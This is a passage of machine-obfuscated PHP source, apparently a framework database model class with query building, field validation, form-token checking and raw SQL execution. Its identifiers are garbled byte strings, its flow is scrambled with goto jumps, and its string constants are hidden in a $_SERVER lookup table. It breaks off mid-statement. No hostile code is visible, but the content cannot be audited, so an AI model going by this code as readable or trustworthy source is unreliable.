AƒÏÈ±À≤π: $fìö›Ñ“˘Ü =& $_SERVER[¯èãÄπµ]; if (is_string($B≥®¯Ñ¡†ÿ) || is_numeric($B≥®¯Ñ¡†ÿ)) { $BÿÚâå’‡Ñ = $this->getPk(); if (strpos($B≥®¯Ñ¡†ÿ, $fìö›Ñ“˘Ü[47])) { $E∆÷É±∂≈Ö[$BÿÚâå’‡Ñ] = array($fìö›Ñ“˘Ü[260], $B≥®¯Ñ¡†ÿ); } else { $E∆÷É±∂≈Ö[$BÿÚâå’‡Ñ] = $B≥®¯Ñ¡†ÿ; } $this->options[$fìö›Ñ“˘Ü[259]] = $E∆÷É±∂≈Ö; } elseif (!1 === $B≥®¯Ñ¡†ÿ) { $B≥®¯Ñ¡†ÿ = $this->_parseOptions(); return $fìö›Ñ“˘Ü[261] . $this->db->buildSelectSql($B≥®¯Ñ¡†ÿ) . $fìö›Ñ“˘Ü[262]; } $B≥®¯Ñ¡†ÿ = $this->_parseOptions(); goto c©Ñ¿£Ñï≥; eñ◊≤í±ë≈: } protected function _afterSelect(&$F†êòÖ‡·å, $dé…¡ˆ∏íû) { } public function buildSql($C≈÷ûçœÃµ = array()) { $dí÷Ø∆¶É¿ =& $_SERVER[¯èãÄπµ]; $C≈÷ûçœÃµ = $this->_parseOptions($C≈÷ûçœÃµ); return $dí÷Ø∆¶É¿[261] . $this->db->buildSelectSql($C≈÷ûçœÃµ) . $dí÷Ø∆¶É¿[262]; } public function optionsValue($D∑∏ûÙá‹ = null) { if (is_null($D∑∏ûÙá‹)) { return $this->options; } elseif (is_array($D∑∏ûÙá‹)) { $this->options = array_merge($this->options, $D∑∏ûÙá‹); } } protected function _parseOptions($e¡ï¡ÿÚÆπ = array()) { goto AŸ›ñ‚”ü’; A»Ñ‚àó†◊: if (isset($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [259]]) && is_array($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [259]]) && !empty($F∫√“Îõ¬Ü) && !isset($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [266]]) && !isset($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [263]])) { foreach ($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [259]] as $a√æç∆‰‚ç => $a∂å“’˜‰„) { $a√æç∆‰‚ç = trim($a√æç∆‰‚ç); if (in_array($a√æç∆‰‚ç, $F∫√“Îõ¬Ü, !0)) { if (is_scalar($a∂å“’˜‰„)) { $this->_parseType($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [259]], $a√æç∆‰‚ç); } } elseif (!is_numeric($a√æç∆‰‚ç) && $cµ¿˜∂«ˆ [70] != substr($a√æç∆‰‚ç, 0, 1) && !1 === strpos($a√æç∆‰‚ç, $cµ¿˜∂«ˆ [91]) && !1 === strpos($a√æç∆‰‚ç, $cµ¿˜∂«ˆ [244]) && !1 === strpos($a√æç∆‰‚ç, $cµ¿˜∂«ˆ [267]) && !1 === strpos($a√æç∆‰‚ç, $cµ¿˜∂«ˆ [268])) { unset($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [259]][$a√æç∆‰‚ç]); } } } $this->_options_filter($e¡ï¡ÿÚÆπ); return $e¡ï¡ÿÚÆπ; goto d˜“Èæß˘; AÓ–ÌÎ¡à´: if (!isset($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [263]])) { $e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [263]] = $this->getTableName(); $F∫√“Îõ¬Ü = $this->fields; } else { $F∫√“Îõ¬Ü = $this->getDbFields(); } if (!empty($e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [264]])) { $e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [263]] .= $cµ¿˜∂«ˆ [50] . $e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [264]]; } $e¡ï¡ÿÚÆπ[$cµ¿˜∂«ˆ [265]] = $this->name; goto A»Ñ‚àó†◊; AŸ›ñ‚”ü’: $cµ¿˜∂«ˆ  =& $_SERVER[¯èãÄπµ]; if (is_array($e¡ï¡ÿÚÆπ)) { $e¡ï¡ÿÚÆπ = array_merge($this->options, $e¡ï¡ÿÚÆπ); } $this->options = array(); goto AÓ–ÌÎ¡à´; d˜“Èæß˘: } protected function _options_filter(&$BßÙÆ¿‚üŸ) { } protected function _parseType(&$bŸãˆÊ√Îé, $fÃÑöª∏Ï≥) { $aÏôË©·Á¥ =& $_SERVER[¯èãÄπµ]; if (empty($this->options[$aÏôË©·Á¥[269]][$aÏôË©·Á¥[4] . $fÃÑöª∏Ï≥])) { $AèäœôÚ˘ë = strtolower($this->fields[$aÏôË©·Á¥[236]][$fÃÑöª∏Ï≥]); if (!1 !== strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[270])) { } elseif (!1 === strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[271]) && !1 !== strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[272])) { $bŸãˆÊ√Îé[$fÃÑöª∏Ï≥] = intval($bŸãˆÊ√Îé[$fÃÑöª∏Ï≥]); } elseif (!1 !== strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[273]) || !1 !== strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[274])) { $bŸãˆÊ√Îé[$fÃÑöª∏Ï≥] = floatval($bŸãˆÊ√Îé[$fÃÑöª∏Ï≥]); } elseif (!1 !== strpos($AèäœôÚ˘ë, $aÏôË©·Á¥[275])) { $bŸãˆÊ√Îé[$fÃÑöª∏Ï≥] = (bool) $bŸãˆÊ√Îé[$fÃÑöª∏Ï≥]; } } } public function find($fÚ∑ƒäúı“ = array()) { goto CÛ»ïóÔñá; F∂Ãù““∏º: $fÚ∑ƒäúı“ = $this->_parseOptions(); $e™ÑƒŒΩ¡˜ = $this->db->select($fÚ∑ƒäúı“); if (!1 === $e™ÑƒŒΩ¡˜) { return !1; } goto AÔù√≤√˜Ò; CÛ»ïóÔñá: $CªƒµÉë“å =& $_SERVER[¯èãÄπµ]; if (is_numeric($fÚ∑ƒäúı“) || is_string($fÚ∑ƒäúı“)) { $Aªø«úè‚Î[$this->getPk()] = intval($fÚ∑ƒäúı“); $this->options[$CªƒµÉë“å[259]] = $Aªø«úè‚Î; } $this->options[$CªƒµÉë“å[276]] = 1; goto F∂Ãù““∏º; AÔù√≤√˜Ò: if (empty($e™ÑƒŒΩ¡˜)) { return null; } $this->data = $e™ÑƒŒΩ¡˜[0]; $this->_afterFind($this->data, $fÚ∑ƒäúı“); goto F”é÷¢≥ê∞; F”é÷¢≥ê∞: if (!empty($this->options[$CªƒµÉë“å[277]])) { return $this->returnResult($this->data, $this->options[$CªƒµÉë“å[277]]); } return $this->data; goto Fïœ¿÷Íñö; Fïœ¿÷Íñö: } protected function _afterFind(&$eµ ïÃ““©, $F¬Ç’ä›ª›) { } protected function returnResult($d≈…√˘∫êô, $cüî¬øÔøê = '') { $C¥ÓÕºéÒ≈ =& $_SERVER[¯èãÄπµ]; if ($cüî¬øÔøê) { if (is_callable($cüî¬øÔøê)) { return call_user_func($cüî¬øÔøê, $d≈…√˘∫êô); } switch (strtolower($cüî¬øÔøê)) { case $C¥ÓÕºéÒ≈[278]: return json_encode($d≈…√˘∫êô); case $C¥ÓÕºéÒ≈[279]: return xml_encode($d≈…√˘∫êô); } } return $d≈…√˘∫êô; } public function parseFieldsMap($DÑÑ£æã∑–, $fÀ«˜Ùû©Ê = 1) { if (!empty($this->_map)) { foreach ($this->_map as $bÉÌ¢ù–ﬂå => $a£ºÚÜÜ∑‚) { if ($fÀ«˜Ùû©Ê == 1) { if (isset($DÑÑ£æã∑–[$a£ºÚÜÜ∑‚])) { $DÑÑ£æã∑–[$bÉÌ¢ù–ﬂå] = $DÑÑ£æã∑–[$a£ºÚÜÜ∑‚]; unset($DÑÑ£æã∑–[$a£ºÚÜÜ∑‚]); } } else { if (isset($DÑÑ£æã∑–[$bÉÌ¢ù–ﬂå])) { $DÑÑ£æã∑–[$a£ºÚÜÜ∑‚] = $DÑÑ£æã∑–[$bÉÌ¢ù–ﬂå]; unset($DÑÑ£æã∑–[$bÉÌ¢ù–ﬂå]); } } } } return $DÑÑ£æã∑–; } public function setField($aÈ±Ωïú£, $d—ÖÚÊÓ–„ = '') { if (is_array($aÈ±Ωïú£)) { $D¢á©û”ÂÙ = $aÈ±Ωïú£; } else { $D¢á©û”ÂÙ[$aÈ±Ωïú£] = $d—ÖÚÊÓ–„; } return $this->save($D¢á©û”ÂÙ); } public function setAdd($e””àÌ‚»ﬁ, $EÙú€√‹∏á = 1) { $eŸπôÇâÑÆ =& $_SERVER[¯èãÄπµ]; $B‹„¥ª¶≤‘ = $e””àÌ‚»ﬁ . $eŸπôÇâÑÆ[280] . $EÙú€√‹∏á; if ($EÙú€√‹∏á < 0) { $B‹„¥ª¶≤‘ = $e””àÌ‚»ﬁ . $EÙú€√‹∏á; } return $this->setField($e””àÌ‚»ﬁ, array($eŸπôÇâÑÆ[281], $B‹„¥ª¶≤‘)); } public function getField($eºÇéÕ ü‚, $a“∑Œ¥ïà∞ = null) { $D‹¡à£°ô≠ =& $_SERVER[¯èãÄπµ]; $aë∑í®ä€‡[$D‹¡à£°ô≠[257]] = $eºÇéÕ ü‚; $aë∑í®ä€‡ = $this->_parseOptions($aë∑í®ä€‡); $eºÇéÕ ü‚ = trim($eºÇéÕ ü‚); if (strpos($eºÇéÕ ü‚, $D‹¡à£°ô≠[47])) { if (!isset($aë∑í®ä€‡[$D‹¡à£°ô≠[276]])) { $aë∑í®ä€‡[$D‹¡à£°ô≠[276]] = is_numeric($a“∑Œ¥ïà∞) ? $a“∑Œ¥ïà∞ : $D‹¡à£°ô≠[33]; } $Dˆ§ÕŸ≠öâ = $this->db->select($aë∑í®ä€‡); if (!empty($Dˆ§ÕŸ≠öâ)) { goto a‘∂ê“óÆŸ; a‘∂ê“óÆŸ: $F›∏◊ÏËÔå = explode($D‹¡à£°ô≠[47], $eºÇéÕ ü‚); $eºÇéÕ ü‚ = array_keys($Dˆ§ÕŸ≠öâ[0]); $F∑™Ω∆¿ä† = array_shift($eºÇéÕ ü‚); goto F≥«∞∞æíä; F≥«∞∞æíä: $còóﬁà≥•ê = array_shift($eºÇéÕ ü‚); $A€õ≈‡ç»Ö = array(); $d«å•∏∫çµ = count($F›∏◊ÏËÔå); goto aê•“Û–ı•; aê•“Û–ı•: foreach ($Dˆ§ÕŸ≠öâ as $FÿÀù€Ú†Ì) { $B‰ ≥òˆåÊ = $FÿÀù€Ú†Ì[$F∑™Ω∆¿ä†]; if (2 == $d«å•∏∫çµ) { $A€õ≈‡ç»Ö[$B‰ ≥òˆåÊ] = $FÿÀù€Ú†Ì[$còóﬁà≥•ê]; } else { $A€õ≈‡ç»Ö[$B‰ ≥òˆåÊ] = is_string($a“∑Œ¥ïà∞) ? implode($a“∑Œ¥ïà∞, $FÿÀù€Ú†Ì) : $FÿÀù€Ú†Ì; } } return $A€õ≈‡ç»Ö; goto B≠ãïÔòµ; B≠ãïÔòµ: } } else { if (!0 !== $a“∑Œ¥ïà∞) { $aë∑í®ä€‡[$D‹¡à£°ô≠[276]] = is_numeric($a“∑Œ¥ïà∞) ? $a“∑Œ¥ïà∞ : 1; } if ($a“∑Œ¥ïà∞ === $D‹¡à£°ô≠[239]) { unset($aë∑í®ä€‡[$D‹¡à£°ô≠[276]]); } $FÿÀù€Ú†Ì = $this->db->select($aë∑í®ä€‡); if (!empty($FÿÀù€Ú†Ì)) { if ($a“∑Œ¥ïà∞ === $D‹¡à£°ô≠[239]) { return reset($FÿÀù€Ú†Ì[0]); } if (!0 !== $a“∑Œ¥ïà∞ && 1 == $aë∑í®ä€‡[$D‹¡à£°ô≠[276]]) { return reset($FÿÀù€Ú†Ì[0]); } foreach ($FÿÀù€Ú†Ì as $dµÊ¬ëâàó) { $Dãâ’ı Øé[] = $dµÊ¬ëâàó[$eºÇéÕ ü‚]; } return $Dãâ’ı Øé; } } return null; } public function create($FÑ”Ü’©≤¥ = '', $fèÁèó¢¨ï = '') { goto FÖé…Í·ô¿; DèıˆÆÒÙç: if ($this->autoCheckFields) { $f•Î«Ûô¡ı = $this->getDbFields(); foreach ($FÑ”Ü’©≤¥ as $FÒßÌêΩπ√ => $dü®Ü‘≤»–) { if (!in_array($FÒßÌêΩπ√, $f•Î«Ûô¡ı)) { unset($FÑ”Ü’©≤¥[$FÒßÌêΩπ√]); } elseif (MAGIC_QUOTES_GPC && is_string($dü®Ü‘≤»–)) { $FÑ”Ü’©≤¥[$FÒßÌêΩπ√] = stripslashes($dü®Ü‘≤»–); } } } $this->autoOperation($FÑ”Ü’©≤¥, $fèÁèó¢¨ï); $this->data = $FÑ”Ü’©≤¥; goto aõÀ¥°ã‹Ç; FÖé…Í·ô¿: $BËëüÊ∏‡† =& $_SERVER[¯èãÄπµ]; if (empty($FÑ”Ü’©≤¥)) { $FÑ”Ü’©≤¥ = $_POST; } elseif (is_object($FÑ”Ü’©≤¥)) { $FÑ”Ü’©≤¥ = get_object_vars($FÑ”Ü’©≤¥); } if (empty($FÑ”Ü’©≤¥) || !is_array($FÑ”Ü’©≤¥)) { $this->error = think_lang($BËëüÊ∏‡†[255]); return !1; } goto BÎŸâÕãòó; aõÀ¥°ã‹Ç: return $FÑ”Ü’©≤¥; goto D∑ÕÏ⁄øíÕ; aÿÏãæá≈: if (isset($f•Î«Ûô¡ı)) { if (is_string($f•Î«Ûô¡ı)) { $f•Î«Ûô¡ı = explode($BËëüÊ∏‡†[47], $f•Î«Ûô¡ı); } if (think_config($BËëüÊ∏‡†[282])) { $f•Î«Ûô¡ı[] = think_config($BËëüÊ∏‡†[283]); } foreach ($FÑ”Ü’©≤¥ as $FÒßÌêΩπ√ => $dü®Ü‘≤»–) { if (!in_array($FÒßÌêΩπ√, $f•Î«Ûô¡ı)) { unset($FÑ”Ü’©≤¥[$FÒßÌêΩπ√]); } } } if (!$this->autoValidation($FÑ”Ü’©≤¥, $fèÁèó¢¨ï)) { return !1; } if (!$this->autoCheckToken($FÑ”Ü’©≤¥)) { $this->error = think_lang($BËëüÊ∏‡†[284]); return !1; } goto DèıˆÆÒÙç; BÎŸâÕãòó: $FÑ”Ü’©≤¥ = $this->parseFieldsMap($FÑ”Ü’©≤¥, 0); $fèÁèó¢¨ï = $fèÁèó¢¨ï ? $fèÁèó¢¨ï : (!empty($FÑ”Ü’©≤¥[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$BËëüÊ∏‡†[257]])) { $f•Î«Ûô¡ı = $this->options[$BËëüÊ∏‡†[257]]; unset($this->options[$BËëüÊ∏‡†[257]]); } elseif ($fèÁèó¢¨ï == THINK_MODEL_INSERT && isset($this->insertFields)) { $f•Î«Ûô¡ı = $this->insertFields; } elseif ($fèÁèó¢¨ï == THINK_MODEL_UPDATE && isset($this->updateFields)) { $f•Î«Ûô¡ı = $this->updateFields; } goto aÿÏãæá≈; D∑ÕÏ⁄øíÕ: } public function autoCheckToken($eß¶àêåù†) { $Bàã≠÷◊Ü„ =& $_SERVER[¯èãÄπµ]; if (isset($this->options[$Bàã≠÷◊Ü„[285]]) && !$this->options[$Bàã≠÷◊Ü„[285]]) { return !0; } if (think_config($Bàã≠÷◊Ü„[282])) { $Cúå≥˘ÜÇÿ = think_config($Bàã≠÷◊Ü„[283]); if (!isset($eß¶àêåù†[$Cúå≥˘ÜÇÿ]) || Session::get($Cúå≥˘ÜÇÿ)) { return !1; } list($dÿƒä‘´©ñ, $bßœâ¶ƒÙÒ) = explode($Bàã≠÷◊Ü„[70], $eß¶àêåù†[$Cúå≥˘ÜÇÿ]); if ($bßœâ¶ƒÙÒ && Session::get($Cúå≥˘ÜÇÿ . $Bàã≠÷◊Ü„[91] . $dÿƒä‘´©ñ) === $bßœâ¶ƒÙÒ) { Session::remove($Cúå≥˘ÜÇÿ . $Bàã≠÷◊Ü„[91] . $dÿƒä‘´©ñ); return !0; } if (think_config($Bàã≠÷◊Ü„[286])) { Session::remove($Cúå≥˘ÜÇÿ . $Bàã≠÷◊Ü„[91] . $dÿƒä‘´©ñ); } return !1; } return !0; } public function regex($d∏ó“¥…‹©, $d’™ŒãŒÇπ) { $féï ˘≤—Ï =& $_SERVER[¯èãÄπµ]; $b∆“◊¢∞©“ = array($féï ˘≤—Ï[287] => $féï ˘≤—Ï[288], $féï ˘≤—Ï[289] => $féï ˘≤—Ï[290], $féï ˘≤—Ï[291] => $féï ˘≤—Ï[292], $féï ˘≤—Ï[293] => $féï ˘≤—Ï[294], $féï ˘≤—Ï[295] => $féï ˘≤—Ï[296], $féï ˘≤—Ï[297] => $féï ˘≤—Ï[298], $féï ˘≤—Ï[299] => $féï ˘≤—Ï[300], $féï ˘≤—Ï[274] => $féï ˘≤—Ï[301], $féï ˘≤—Ï[302] => $féï ˘≤—Ï[303]); if (isset($b∆“◊¢∞©“[strtolower($d’™ŒãŒÇπ)])) { $d’™ŒãŒÇπ = $b∆“◊¢∞©“[strtolower($d’™ŒãŒÇπ)]; } return preg_match($d’™ŒãŒÇπ, $d∏ó“¥…‹©) === 1; } private function autoOperation(&$BÏ†ÖÉÉ®º, $B¨ä∫ç“ ©) { $c›˘ ¯Øû¨ =& $_SERVER[¯èãÄπµ]; if (!empty($this->options[$c›˘ ¯Øû¨[304]])) { $D™–É›¥ôù = $this->options[$c›˘ ¯Øû¨[304]]; unset($this->options[$c›˘ ¯Øû¨[304]]); } elseif (!empty($this->_auto)) { $D™–É›¥ôù = $this->_auto; } if (isset($D™–É›¥ôù)) { foreach ($D™–É›¥ôù as $cû∞≈ÇÉßá) { if (empty($cû∞≈ÇÉßá[2])) { $cû∞≈ÇÉßá[2] = THINK_MODEL_INSERT; } if ($B¨ä∫ç“ © == $cû∞≈ÇÉßá[2] || $cû∞≈ÇÉßá[2] == THINK_MODEL_BOTH) { switch (trim($cû∞≈ÇÉßá[3])) { case $c›˘ ¯Øû¨[305]: case $c›˘ ¯Øû¨[306]: $fú≈·⁄¬Õ = isset($cû∞≈ÇÉßá[4]) ? (array) $cû∞≈ÇÉßá[4] : array(); if (isset($BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]])) { array_unshift($fú≈·⁄¬Õ, $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]]); } if ($c›˘ ¯Øû¨[305] == $cû∞≈ÇÉßá[3]) { $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]] = call_user_func_array($cû∞≈ÇÉßá[1], $fú≈·⁄¬Õ); } else { $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]] = call_user_func_array(array(&$this, $cû∞≈ÇÉßá[1]), $fú≈·⁄¬Õ); } break; case $c›˘ ¯Øû¨[257]: $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]] = $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[1]]; break; case $c›˘ ¯Øû¨[307]: if ($c›˘ ¯Øû¨[33] === $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]]) { unset($BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]]); } break; case $c›˘ ¯Øû¨[308]: default: $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]] = $cû∞≈ÇÉßá[1]; } if (!1 === $BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]]) { unset($BÏ†ÖÉÉ®º[$cû∞≈ÇÉßá[0]]); } } } } return $BÏ†ÖÉÉ®º; } protected function autoValidation($CˆàÏÃÁŸç, $AÍÛ§¬ úì) { $c¯•˘è™≥¢ =& $_SERVER[¯èãÄπµ]; if (!empty($this->options[$c¯•˘è™≥¢[309]])) { $BåΩçÉêõ± = $this->options[$c¯•˘è™≥¢[309]]; unset($this->options[$c¯•˘è™≥¢[309]]); } elseif (!empty($this->_validate)) { $BåΩçÉêõ± = $this->_validate; } if (isset($BåΩçÉêõ±)) { if ($this->patchValidate) { $this->error = array(); } foreach ($BåΩçÉêõ± as $a∂ÉÑÛ’ıÀ => $AÇÎí ‡ùº) { if (empty($AÇÎí ‡ùº[5]) || $AÇÎí ‡ùº[5] == THINK_MODEL_BOTH || $AÇÎí ‡ùº[5] == $AÍÛ§¬ úì) { if (0 == strpos($AÇÎí ‡ùº[2], $c¯•˘è™≥¢[310]) && strpos($AÇÎí ‡ùº[2], $c¯•˘è™≥¢[311])) { $AÇÎí ‡ùº[2] = think_lang(substr($AÇÎí ‡ùº[2], 2, -1)); } $AÇÎí ‡ùº[3] = isset($AÇÎí ‡ùº[3]) ? $AÇÎí ‡ùº[3] : THINK_EXISTS_VALIDATE; $AÇÎí ‡ùº[4] = isset($AÇÎí ‡ùº[4]) ? $AÇÎí ‡ùº[4] : $c¯•˘è™≥¢[312]; switch ($AÇÎí ‡ùº[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($CˆàÏÃÁŸç, $AÇÎí ‡ùº)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($c¯•˘è™≥¢[33] != trim($CˆàÏÃÁŸç[$AÇÎí ‡ùº[0]])) { if (!1 === $this->_validationField($CˆàÏÃÁŸç, $AÇÎí ‡ùº)) { return !1; } } break; default: if (isset($CˆàÏÃÁŸç[$AÇÎí ‡ùº[0]])) { if (!1 === $this->_validationField($CˆàÏÃÁŸç, $AÇÎí ‡ùº)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($dŸá˘ÉØ»†, $Bƒäù∂–Í≠) { if (!1 === $this->_validationFieldItem($dŸá˘ÉØ»†, $Bƒäù∂–Í≠)) { if ($this->patchValidate) { $this->error[$Bƒäù∂–Í≠[0]] = $Bƒäù∂–Í≠[2]; } else { $this->error = $Bƒäù∂–Í≠[2]; return !1; } } return; } protected function _validationFieldItem($f¨›ÇçöÍ±, $Fà÷ÎÎõùÑ) { $AÎâ·ˆÁÉ£ =& $_SERVER[¯èãÄπµ]; switch (strtolower(trim($Fà÷ÎÎõùÑ[4]))) { case $AÎâ·ˆÁÉ£[305]: case $AÎâ·ˆÁÉ£[306]: $A≠∫∑∆œ„– = isset($Fà÷ÎÎõùÑ[6]) ? (array) $Fà÷ÎÎõùÑ[6] : array(); if (is_string($Fà÷ÎÎõùÑ[0]) && strpos($Fà÷ÎÎõùÑ[0], $AÎâ·ˆÁÉ£[47])) { $Fà÷ÎÎõùÑ[0] = explode($AÎâ·ˆÁÉ£[47], $Fà÷ÎÎõùÑ[0]); } if (is_array($Fà÷ÎÎõùÑ[0])) { foreach ($Fà÷ÎÎõùÑ[0] as $Cãä¿çâ’ï) { $aÆ¬Ù•ƒîü[$Cãä¿çâ’ï] = $f¨›ÇçöÍ±[$Cãä¿çâ’ï]; } array_unshift($A≠∫∑∆œ„–, $aÆ¬Ù•ƒîü); } else { array_unshift($A≠∫∑∆œ„–, $f¨›ÇçöÍ±[$Fà÷ÎÎõùÑ[0]]); } if ($AÎâ·ˆÁÉ£[305] == $Fà÷ÎÎõùÑ[4]) { return call_user_func_array($Fà÷ÎÎõùÑ[1], $A≠∫∑∆œ„–); } else { return call_user_func_array(array(&$this, $Fà÷ÎÎõùÑ[1]), $A≠∫∑∆œ„–); } case $AÎâ·ˆÁÉ£[313]: return $f¨›ÇçöÍ±[$Fà÷ÎÎõùÑ[0]] == $f¨›ÇçöÍ±[$Fà÷ÎÎõùÑ[1]]; case $AÎâ·ˆÁÉ£[314]: if (is_string($Fà÷ÎÎõùÑ[0]) && strpos($Fà÷ÎÎõùÑ[0], $AÎâ·ˆÁÉ£[47])) { $Fà÷ÎÎõùÑ[0] = explode($AÎâ·ˆÁÉ£[47], $Fà÷ÎÎõùÑ[0]); } $AÃºî°ìå± = array(); if (is_array($Fà÷ÎÎõùÑ[0])) { foreach ($Fà÷ÎÎõùÑ[0] as $Cãä¿çâ’ï) { $AÃºî°ìå±[$Cãä¿çâ’ï] = $f¨›ÇçöÍ±[$Cãä¿çâ’ï]; } } else { $AÃºî°ìå±[$Fà÷ÎÎõùÑ[0]] = $f¨›ÇçöÍ±[$Fà÷ÎÎõùÑ[0]]; } if (!empty($f¨›ÇçöÍ±[$this->getPk()])) { $AÃºî°ìå±[$this->getPk()] = array($AÎâ·ˆÁÉ£[315], $f¨›ÇçöÍ±[$this->getPk()]); } if ($this->where($AÃºî°ìå±)->find()) { return !1; } return !0; default: return $this->check($f¨›ÇçöÍ±[$Fà÷ÎÎõùÑ[0]], $Fà÷ÎÎõùÑ[1], $Fà÷ÎÎõùÑ[4]); } } public function check($Aà€…∑ó†ß, $dá÷‡Í ô, $eı‰ª‰…√∏ = "\162\145\147\145\x78") { $C∑äÊ÷à≈ê =& $_SERVER[¯èãÄπµ]; $eı‰ª‰…√∏ = strtolower(trim($eı‰ª‰…√∏)); switch ($eı‰ª‰…√∏) { case $C∑äÊ÷à≈ê[7]: case $C∑äÊ÷à≈ê[316]: $e’È∞ﬁ„ﬁ∆ = is_array($dá÷‡Í ô) ? $dá÷‡Í ô : explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô); return $eı‰ª‰…√∏ == $C∑äÊ÷à≈ê[7] ? in_array($Aà€…∑ó†ß, $e’È∞ﬁ„ﬁ∆) : !in_array($Aà€…∑ó†ß, $e’È∞ﬁ„ﬁ∆); case $C∑äÊ÷à≈ê[317]: case $C∑äÊ÷à≈ê[318]: if (is_array($dá÷‡Í ô)) { $A√£ü§»¢Ú = $dá÷‡Í ô[0]; $EöˆÖ≈Õ∆† = $dá÷‡Í ô[1]; } else { list($A√£ü§»¢Ú, $EöˆÖ≈Õ∆†) = explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô); } return $eı‰ª‰…√∏ == $C∑äÊ÷à≈ê[317] ? $Aà€…∑ó†ß >= $A√£ü§»¢Ú && $Aà€…∑ó†ß <= $EöˆÖ≈Õ∆† : $Aà€…∑ó†ß < $A√£ü§»¢Ú || $Aà€…∑ó†ß > $EöˆÖ≈Õ∆†; case $C∑äÊ÷à≈ê[319]: case $C∑äÊ÷à≈ê[320]: return $eı‰ª‰…√∏ == $C∑äÊ÷à≈ê[319] ? $Aà€…∑ó†ß == $dá÷‡Í ô : $Aà€…∑ó†ß != $dá÷‡Í ô; case $C∑äÊ÷à≈ê[321]: $A¬ã√ç›Ö = mb_strlen($Aà€…∑ó†ß, $C∑äÊ÷à≈ê[322]); if (strpos($dá÷‡Í ô, $C∑äÊ÷à≈ê[47])) { list($A√£ü§»¢Ú, $EöˆÖ≈Õ∆†) = explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô); return $A¬ã√ç›Ö >= $A√£ü§»¢Ú && $A¬ã√ç›Ö <= $EöˆÖ≈Õ∆†; } else { return $A¬ã√ç›Ö == $dá÷‡Í ô; } case $C∑äÊ÷à≈ê[323]: list($A∆ﬁ˜˘ë«Ê, $fÑﬁ¥ÈŒÕÜ) = explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô); if (!is_numeric($A∆ﬁ˜˘ë«Ê)) { $A∆ﬁ˜˘ë«Ê = strtotime($A∆ﬁ˜˘ë«Ê); } if (!is_numeric($fÑﬁ¥ÈŒÕÜ)) { $fÑﬁ¥ÈŒÕÜ = strtotime($fÑﬁ¥ÈŒÕÜ); } return NOW_TIME >= $A∆ﬁ˜˘ë«Ê && NOW_TIME <= $fÑﬁ¥ÈŒÕÜ; case $C∑äÊ÷à≈ê[324]: return in_array(get_client_ip(), explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô)); case $C∑äÊ÷à≈ê[325]: return !in_array(get_client_ip(), explode($C∑äÊ÷à≈ê[47], $dá÷‡Í ô)); case $C∑äÊ÷à≈ê[312]: default: return $this->regex($Aà€…∑ó†ß, $dá÷‡Í ô); } } public function query($bÊıè‚›ÛÎ, $F√≠Üº‡ÑÜ = false) { $fìÜç£‡”≤ =& $_SERVER[¯èãÄπµ]; if (!is_bool($F√≠Üº‡ÑÜ) && !is_array($F√≠Üº‡ÑÜ)) { $F√≠Üº‡ÑÜ = func_get_args(); array_shift($F√≠Üº‡ÑÜ); } $bÊıè‚›ÛÎ = str_replace(array($fìÜç£‡”≤[213], $fìÜç£‡”≤[326]), $fìÜç£‡”≤[50], $bÊıè‚›ÛÎ); $bÊıè‚›ÛÎ = $this->parseSql($bÊıè‚›ÛÎ, $F√≠Üº‡ÑÜ); return $this->db->query($bÊıè‚›ÛÎ); } public function execute($Bôêè€ï√ê, $F°Æ±áçƒÔ = false) { if (!is_bool($F°Æ±áçƒÔ) && !is_array($F°Æ±áçƒÔ)) { $F°Æ±áçƒÔ = func_get_args(); array_shift($F°Æ±áçƒÔ); } $Bôêè€ï√ê = $this->parseSql($Bôêè€ï√ê, $F°Æ±áçƒÔ); return $this->db->execute($Bôêè€ï√ê); } protected function parseSql($bõò¥◊ºÑñ, $Aù“ä•—¬‰) { $eﬁ≠ç‰ŸÉì =& $_SERVER[¯èãÄπµ]; if (!0 === $Aù“ä•—¬‰) { $aÔæ‘¶¥⁄√ = $this->_parseOptions(); $bõò¥◊ºÑñ = $this->db->parseSql($bõò¥◊ºÑñ, $aÔæ‘¶¥⁄√); } elseif (is_array($Aù“ä•—¬‰)) { $Aù“ä•—¬‰ = array_map(array($this->db, $eﬁ≠ç‰ŸÉì[327]), $Aù“ä•—¬‰); $bõò¥◊ºÑñ = vsprintf($bõò¥◊ºÑñ, $Aù“ä•—¬‰); } else { $bõò¥◊ºÑñ = strtr($bõò¥◊ºÑñ, array($eﬁ≠ç‰ŸÉì[328] => $this->getTableName(), $eﬁ≠ç‰ŸÉì[329] => think_config($eﬁ≠ç‰ŸÉì[228]))); } $this->db->setModel($this->name); return 